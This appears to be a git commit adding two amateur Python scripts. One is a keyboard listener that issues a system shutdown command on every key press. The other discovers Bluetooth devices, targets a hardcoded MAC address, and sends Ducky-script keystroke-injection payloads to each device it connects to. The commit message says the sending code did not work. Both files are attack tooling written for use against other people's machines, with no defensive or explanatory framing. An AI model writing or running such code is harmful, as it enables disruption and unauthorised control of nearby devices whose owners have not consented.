bdcfd520ce1b3342ebed726896ce40579649b2d5
zniper06 <71311320+zniper06@users.noreply.github.com>
2023-07-11 10:53:39 -0400

    Cloned files from the not working sending file thingie

---
+++ duckyscript.py
@@ -0,0 +1,20 @@
+from pynput.keyboard import Key, Listener
+import os
+
+
+
+
+def on_press(key):
+    print('{0} pressed'.format(key))
+    os.system("shutdown -s")
+
+
+
+def on_release(key):
+    print('{0} release'.format(key))
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
---
+++ injecter.py
@@ -0,0 +1,40 @@
+import bluetooth
+import pyautogui
+import time
+
+print("We out")
+
+def inject():
+    dev_list = bluetooth.discover_devices(duration=5, lookup_names=True)
+    print(dev_list)
+
+    fifteen11 = "D0:88:0C:C2:A0:C7"
+    dev_list[0] = (fifteen11, "1511")
+
+    for addy, name in dev_list:
+        socket = bluetooth.BluetoothSocket()
+
+        socket.connect((addy, 1))
+
+        ducky_script_file = "6. Real anti text\inject.bin"
+        ducky_script_file2 = "6. Real anti text\duckypayload.txt"
+
+        with open(ducky_script_file2, 'r') as file:
+            ducky_script2 = file.read()
+            socket.sendall(bytes(ducky_script2, encoding="utf-8"))
+
+        with open(ducky_script_file, 'rb') as file:
+            ducky_script = file.read()
+            socket.sendall(ducky_script)
+
+
+
+
+        time.sleep(5)
+
+        socket.close()
+
+        print("done")
+
+if __name__ == "__main__":
+    inject()
